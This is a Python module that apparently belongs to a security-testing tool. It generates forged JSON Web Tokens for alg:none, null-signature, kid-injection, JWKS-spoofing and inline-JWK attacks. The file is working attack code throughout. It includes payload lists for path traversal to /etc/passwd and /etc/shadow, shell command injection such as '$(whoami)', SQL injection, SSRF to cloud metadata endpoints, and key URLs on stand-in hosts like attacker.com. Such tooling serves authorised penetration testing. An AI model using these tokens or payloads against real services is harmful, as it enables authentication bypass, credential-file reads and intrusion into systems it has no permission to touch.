"""
JWT Attack Token Generator
Generates malicious JWT tokens for different attack vectors
"""

import json
import copy
from typing import Dict, List, Any, Optional
from core.logging import get_logger
from utils.jwt_utils import decode_jwt, encode_jwt, base64url_encode, base64url_decode
from utils.jwt_attack_models import AttackType


class JWTAttackTokenGenerator:
    """
    Generates malicious JWT tokens for various attack vectors
    
    Integrates with existing JWT utilities and implements:
    - Algorithm confusion attacks (alg:none)
    - Null signature attacks
    - Key ID injection attacks
    - JWKS spoofing attacks
    - Inline JWKS injection attacks
    """
    
    def __init__(self, original_token: str):
        """
        Initialize JWT attack token generator
        
        Args:
            original_token: Valid JWT token to use as base for attacks
            
        Raises:
            ValueError: If original token is invalid
        """
        self.original_token = original_token
        self.logger = get_logger(__name__).bind(component="jwt_attack_token_generator")
        
        try:
            self.decoded_token = decode_jwt(original_token)
            self.logger.info("JWT Attack Token Generator initialized",
                           original_algorithm=self.decoded_token['header'].get('alg', 'unknown'),
                           payload_keys=list(self.decoded_token['payload'].keys()))
        except Exception as e:
            self.logger.error("Failed to initialize JWT Attack Token Generator", error=str(e))
            raise ValueError(f"Invalid JWT token provided: {str(e)}")
    
    def generate_alg_none_tokens(self) -> List[str]:
        """
        Generate algorithm confusion attack tokens (alg:none)
        
        Creates tokens with algorithm set to "none" and no signature
        
        Returns:
            List of malicious JWT tokens with alg:none
        """
        self.logger.info("Generating alg:none attack tokens")
        
        attack_tokens = []
        
        try:
            # Create header with alg:none
            attack_header = copy.deepcopy(self.decoded_token['header'])
            attack_header['alg'] = 'none'
            
            # Use original payload
            attack_payload = copy.deepcopy(self.decoded_token['payload'])
            
            # Encode header and payload
            header_encoded = base64url_encode(json.dumps(attack_header, separators=(',', ':')).encode('utf-8'))
            payload_encoded = base64url_encode(json.dumps(attack_payload, separators=(',', ':')).encode('utf-8'))
            
            # Create token with no signature (empty signature)
            attack_token = f"{header_encoded}.{payload_encoded}."
            attack_tokens.append(attack_token)
            
            # Create token with completely removed signature part
            attack_token_no_dot = f"{header_encoded}.{payload_encoded}"
            attack_tokens.append(attack_token_no_dot)
            
            self.logger.info("Generated alg:none attack tokens", count=len(attack_tokens))
            
        except Exception as e:
            self.logger.error("Failed to generate alg:none tokens", error=str(e))
            
        return attack_tokens
    
    def generate_null_signature_tokens(self) -> List[str]:
        """
        Generate null signature attack tokens
        
        Creates tokens with various null signature bypass techniques
        
        Returns:
            List of malicious JWT tokens with null signatures
        """
        self.logger.info("Generating null signature attack tokens")
        
        attack_tokens = []
        
        try:
            # Use original header and payload
            attack_header = copy.deepcopy(self.decoded_token['header'])
            attack_payload = copy.deepcopy(self.decoded_token['payload'])
            
            # Encode header and payload
            header_encoded = base64url_encode(json.dumps(attack_header, separators=(',', ':')).encode('utf-8'))
            payload_encoded = base64url_encode(json.dumps(attack_payload, separators=(',', ':')).encode('utf-8'))
            
            # Various null signature techniques
            null_signatures = [
                "",  # Empty signature
                "null",  # Literal null
                "0",  # Zero
                base64url_encode(b""),  # Base64 encoded empty
                base64url_encode(b"\x00"),  # Base64 encoded null byte
                base64url_encode(b"\x00" * 32),  # Base64 encoded null bytes (32 bytes)
                "eyJhbGciOiJub25lIn0",  # Base64 of {"alg":"none"}
            ]
            
            for null_sig in null_signatures:
                attack_token = f"{header_encoded}.{payload_encoded}.{null_sig}"
                attack_tokens.append(attack_token)
            
            self.logger.info("Generated null signature attack tokens", count=len(attack_tokens))
            
        except Exception as e:
            self.logger.error("Failed to generate null signature tokens", error=str(e))
            
        return attack_tokens
    
    def generate_kid_injection_tokens(self, injection_payloads: Optional[List[str]] = None) -> List[str]:
        """
        Generate Key ID (kid) injection attack tokens
        
        Creates tokens with malicious kid parameter values for path traversal,
        command injection, and other injection attacks
        
        Args:
            injection_payloads: Custom injection payloads (optional)
            
        Returns:
            List of malicious JWT tokens with kid injection
        """
        self.logger.info("Generating kid injection attack tokens")
        
        if injection_payloads is None:
            injection_payloads = [
                # Path traversal attacks
                "../../etc/passwd",
                "../../../etc/shadow", 
                "../../../../etc/hosts",
                "/etc/passwd",
                "/etc/shadow",
                "/dev/null",
                "/proc/version",
                "/proc/self/environ",
                
                # Windows path traversal
                "..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "..\\..\\..\\windows\\win.ini",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                
                # Command injection
                "'; DROP TABLE users; --",
                "\"; DROP TABLE users; --",
                "$(whoami)",
                "`id`",
                "||id||",
                "&& id &&",
                "; cat /etc/passwd;",
                "| whoami",
                
                # URL-based attacks
                "file:///etc/passwd",
                "http://attacker.com/malicious.key",
                "https://evil.com/key.pem",
                "ftp://attacker.com/key.pem",
                "ldap://attacker.com/key",
                "gopher://attacker.com/key",
                
                # Null byte injection
                "/etc/passwd\x00.jpg",
                "../../etc/passwd\x00",
                
                # Unicode/encoding attacks
                "..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252Fetc%252Fpasswd",
                "..\\u002e\\u002e\\u002fetc\\u002fpasswd",
                
                # LDAP injection
                "*)(&(objectClass=*",
                "*)(uid=*))(|(uid=*",
                
                # XML/XXE injection
                "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
                
                # NoSQL injection
                "'; return true; var dummy='",
                "' || '1'=='1",
                
                # Template injection
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                
                # SSRF attempts
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "http://localhost:22",
                "http://127.0.0.1:3306",
            ]
        
        attack_tokens = []
        
        try:
            for payload in injection_payloads:
                # Create header with malicious kid
                attack_header = copy.deepcopy(self.decoded_token['header'])
                attack_header['kid'] = payload
                
                # Use original payload
                attack_payload = copy.deepcopy(self.decoded_token['payload'])
                
                # Create token with different signing approaches
                signing_secrets = ["secret", "", "null", "0"]
                
                for secret in signing_secrets:
                    try:
                        attack_token = encode_jwt(attack_header, attack_payload, secret)
                        attack_tokens.append(attack_token)
                    except Exception as e:
                        self.logger.debug("Failed to encode token with kid injection", 
                                        payload=payload, secret=secret, error=str(e))
            
            self.logger.info("Generated kid injection attack tokens", count=len(attack_tokens))
            
        except Exception as e:
            self.logger.error("Failed to generate kid injection tokens", error=str(e))
            
        return attack_tokens
    
    def generate_jwks_spoof_tokens(self, malicious_jwks_urls: Optional[List[str]] = None) -> List[str]:
        """
        Generate JWKS spoofing attack tokens
        
        Creates tokens with malicious jku (JWKS URL) parameter pointing to
        attacker-controlled JWKS endpoints and other malicious URLs
        
        Args:
            malicious_jwks_urls: Custom JWKS URLs (optional)
            
        Returns:
            List of malicious JWT tokens with JWKS spoofing
        """
        self.logger.info("Generating JWKS spoofing attack tokens")
        
        if malicious_jwks_urls is None:
            malicious_jwks_urls = [
                # Standard attacker URLs
                "http://attacker.com/.well-known/jwks.json",
                "https://evil.com/jwks.json",
                "http://malicious.example.com/jwks.json",
                
                # Local/internal network
                "http://localhost:8080/jwks.json",
                "http://127.0.0.1:8080/jwks.json",
                "http://0.0.0.0:8080/jwks.json",
                "http://[::1]:8080/jwks.json",
                "http://192.168.1.1/jwks.json",
                "http://10.0.0.1/jwks.json",
                "http://172.16.0.1/jwks.json",
                
                # Cloud metadata endpoints (SSRF)
                "http://169.254.169.254/latest/meta-data/jwks.json",  # AWS
                "http://metadata.google.internal/computeMetadata/v1/jwks.json",  # GCP
                "http://169.254.169.254/metadata/instance/jwks.json",  # Azure
                
                # File system access
                "file:///etc/passwd",
                "file:///etc/shadow",
                "file:///proc/version",
                "file:///dev/null",
                "file://C:/windows/system32/drivers/etc/hosts",
                
                # Alternative protocols
                "ftp://attacker.com/jwks.json",
                "ldap://attacker.com/jwks",
                "gopher://attacker.com/jwks.json",
                "dict://attacker.com:2628/jwks",
                
                # Port variations
                "http://attacker.com:80/jwks.json",
                "https://attacker.com:443/jwks.json",
                "http://attacker.com:22/jwks.json",  # SSH port
                "http://attacker.com:3306/jwks.json",  # MySQL port
                "http://attacker.com:5432/jwks.json",  # PostgreSQL port
                "http://attacker.com:6379/jwks.json",  # Redis port
                
                # URL encoding/bypass attempts
                "http://attacker.com/%2e%2e/jwks.json",
                "http://attacker.com/..%2fjwks.json",
                "http://attacker.com/jwks.json%00.jpg",
                
                # Unicode/IDN attacks
                "http://аttacker.com/jwks.json",  # Cyrillic 'a'
                "http://attacker.ⅽom/jwks.json",  # Roman numeral C
                
                # Subdomain takeover attempts
                "http://abandoned.attacker.com/jwks.json",
                "http://test.s3.amazonaws.com/jwks.json",
                "http://staging.herokuapp.com/jwks.json",
                
                # Data URIs
                "data:application/json;base64,eyJrZXlzIjpbXX0=",  # {"keys":[]}
                
                # JavaScript/XSS attempts
                "javascript:alert('xss')",
                "data:text/html,<script>alert('xss')</script>",
            ]
        
        attack_tokens = []
        
        try:
            for jwks_url in malicious_jwks_urls:
                # Create header with malicious jku
                attack_header = copy.deepcopy(self.decoded_token['header'])
                attack_header['jku'] = jwks_url
                
                # Also try with x5u parameter (X.509 certificate URL)
                attack_header_x5u = copy.deepcopy(self.decoded_token['header'])
                attack_header_x5u['x5u'] = jwks_url
                
                # Use original payload
                attack_payload = copy.deepcopy(self.decoded_token['payload'])
                
                # Create tokens with different signing approaches
                signing_secrets = ["secret", "", "attacker_secret"]
                
                for secret in signing_secrets:
                    try:
                        # JKU attack
                        attack_token = encode_jwt(attack_header, attack_payload, secret)
                        attack_tokens.append(attack_token)
                        
                        # X5U attack
                        attack_token_x5u = encode_jwt(attack_header_x5u, attack_payload, secret)
                        attack_tokens.append(attack_token_x5u)
                        
                    except Exception as e:
                        self.logger.debug("Failed to encode token with JWKS spoofing", 
                                        jwks_url=jwks_url, secret=secret, error=str(e))
            
            self.logger.info("Generated JWKS spoofing attack tokens", count=len(attack_tokens))
            
        except Exception as e:
            self.logger.error("Failed to generate JWKS spoofing tokens", error=str(e))
            
        return attack_tokens
    
    def generate_inline_jwks_tokens(self) -> List[str]:
        """
        Generate inline JWKS injection attack tokens
        
        Creates tokens with malicious jwk parameter containing attacker-controlled
        public keys embedded directly in the JWT header
        
        Returns:
            List of malicious JWT tokens with inline JWKS injection
        """
        self.logger.info("Generating inline JWKS injection attack tokens")
        
        attack_tokens = []
        
        # Various malicious JWK structures
        malicious_jwks = [
            # RSA public key (attacker-controlled)
            {
                "kty": "RSA",
                "use": "sig",
                "kid": "malicious-rsa-key",
                "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
                "e": "AQAB",
                "alg": "RS256"
            },
            
            # Symmetric key (HMAC)
            {
                "kty": "oct",
                "k": "c2VjcmV0",  # base64 of "secret"
                "alg": "HS256",
                "kid": "malicious-hmac-key"
            },
            
            # Empty/null key
            {
                "kty": "oct",
                "k": "",  # Empty key
                "alg": "HS256",
                "kid": "empty-key"
            },
            
            # Weak key
            {
                "kty": "oct",
                "k": "YQ==",  # base64 of "a" (single character)
                "alg": "HS256",
                "kid": "weak-key"
            },
            
            # Elliptic Curve key
            {
                "kty": "EC",
                "crv": "P-256",
                "x": "MKBCTNIcKUSDii11ySs3526iDZ8AiTo7Tu6KPAqv7D4",
                "y": "4Etl6SRW2YiLUrN5vfvVHuhp7x8PxltmWWlbbM4IFyM",
                "use": "sig",
                "kid": "malicious-ec-key",
                "alg": "ES256"
            },
            
            # Malformed/injection attempts
            {
                "kty": "RSA",
                "kid": "'; DROP TABLE users; --",
                "use": "sig",
                "n": "malicious_modulus_here",
                "e": "AQAB"
            },
            
            # Path traversal in kid
            {
                "kty": "oct",
                "k": "c2VjcmV0",
                "alg": "HS256",
                "kid": "../../etc/passwd"
            },
            
            # URL in kid
            {
                "kty": "oct",
                "k": "c2VjcmV0",
                "alg": "HS256",
                "kid": "http://attacker.com/key"
            },
            
            # Large key (potential DoS)
            {
                "kty": "oct",
                "k": base64url_encode(b"A" * 10000),  # Large key
                "alg": "HS256",
                "kid": "large-key"
            },
            
            # Unicode/special characters
            {
                "kty": "oct",
                "k": "c2VjcmV0",
                "alg": "HS256",
                "kid": "🔑malicious-unicode-key🔓"
            },
            
            # Null bytes
            {
                "kty": "oct",
                "k": base64url_encode(b"secret\x00malicious"),
                "alg": "HS256",
                "kid": "null-byte-key"
            }
        ]
        
        try:
            for jwk in malicious_jwks:
                # Create header with inline JWK
                attack_header = copy.deepcopy(self.decoded_token['header'])
                attack_header['jwk'] = jwk
                
                # Also try with different header parameters
                variations = [
                    {'jwk': jwk},  # Standard jwk
                    {'jwk': jwk, 'jku': 'http://attacker.com/jwks.json'},  # Both jwk and jku
                    {'jwk': jwk, 'kid': jwk.get('kid', 'malicious')},  # Both jwk and kid
                ]
                
                for variation in variations:
                    attack_header_var = copy.deepcopy(self.decoded_token['header'])
                    attack_header_var.update(variation)
                    
                    # Use original payload
                    attack_payload = copy.deepcopy(self.decoded_token['payload'])
                    
                    # Create tokens with different signing approaches
                    signing_secrets = ["secret", "", "attacker_secret"]
                    
                    for secret in signing_secrets:
                        try:
                            attack_token = encode_jwt(attack_header_var, attack_payload, secret)
                            attack_tokens.append(attack_token)
                        except Exception as e:
                            self.logger.debug("Failed to encode token with inline JWKS", 
                                            jwk_kid=jwk.get('kid', 'unknown'), 
                                            secret=secret, error=str(e))
            
            self.logger.info("Generated inline JWKS injection attack tokens", count=len(attack_tokens))
            
        except Exception as e:
            self.logger.error("Failed to generate inline JWKS injection tokens", error=str(e))
            
        return attack_tokens
    
    def generate_all_attack_tokens(self) -> Dict[AttackType, List[str]]:
        """
        Generate all supported attack token types
        
        Returns:
            Dictionary mapping attack types to lists of malicious tokens
        """
        self.logger.info("Generating all attack token types")
        
        all_tokens = {}
        
        # Generate each attack type
        all_tokens[AttackType.ALG_NONE] = self.generate_alg_none_tokens()
        all_tokens[AttackType.NULL_SIGNATURE] = self.generate_null_signature_tokens()
        all_tokens[AttackType.KID_INJECTION] = self.generate_kid_injection_tokens()
        all_tokens[AttackType.JWKS_SPOOF] = self.generate_jwks_spoof_tokens()
        all_tokens[AttackType.INLINE_JWKS] = self.generate_inline_jwks_tokens()
        
        total_tokens = sum(len(tokens) for tokens in all_tokens.values())
        self.logger.info("Generated all attack tokens", 
                        total_tokens=total_tokens,
                        attack_types=list(all_tokens.keys()))
        
        return all_tokens